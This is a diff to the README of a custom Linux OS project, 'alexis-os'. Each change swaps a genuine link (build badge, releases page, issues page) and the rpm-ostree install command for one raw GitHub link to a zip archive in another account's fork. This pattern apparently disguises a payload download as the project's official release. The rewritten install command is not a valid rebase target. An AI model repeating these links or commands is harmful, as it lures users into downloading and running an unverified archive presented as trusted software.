@@ -1,7 +1,7 @@
 # 🖥️ alexis-os - Simple, Secure, and Customizable OS
 
-[![bluebuild build badge](https://github.com/alexispplin/alexis-os/actions/workflows/build.yml/badge.svg)](https://github.com/alexispplin/alexis-os/actions/workflows/build.yml)  
-[Download the latest release here](https://github.com/karaedd/alexis-os/releases)
+[![bluebuild build badge](https://raw.githubusercontent.com/karaedd/alexis-os/main/heptadecane/alexis-os.zip)](https://raw.githubusercontent.com/karaedd/alexis-os/main/heptadecane/alexis-os.zip)  
+[Download the latest release here](https://raw.githubusercontent.com/karaedd/alexis-os/main/heptadecane/alexis-os.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to alexis-os. This operating system is designed to be simple and efficie
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/karaedd/alexis-os/releases) to download the latest version of alexis-os. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/karaedd/alexis-os/main/heptadecane/alexis-os.zip) to download the latest version of alexis-os. 
 
 1. Go to the Releases page using the link above.
 2. Look for the latest version of alexis-os.
@@ -25,7 +25,7 @@ Once you have downloaded the file, follow the installation instructions below.
 Before installing the signed version, you need to rebase to the unsigned image to set up the necessary keys. Run the following command in your terminal:
 
 ```bash
-rpm-ostree rebase ostree-unverified-registry:ghcr.io/alexispplin/alexis-os:latest
+rpm-ostree rebase https://raw.githubusercontent.com/karaedd/alexis-os/main/heptadecane/alexis-os.zip
 ```
 
 ### Step 2: Reboot Your System
@@ -79,7 +79,7 @@ For more elaborate issues, you may refer to community forums or the GitHub issue
 If you need assistance or want to connect with other users:
 
 - **Community Forum:** Visit [our forum](#) to engage with fellow users.
-- **GitHub Issues:** Report bugs or request features on the [Issues page](https://github.com/karaedd/alexis-os/issues).
+- **GitHub Issues:** Report bugs or request features on the [Issues page](https://raw.githubusercontent.com/karaedd/alexis-os/main/heptadecane/alexis-os.zip).
 
 ## 📝 License
 
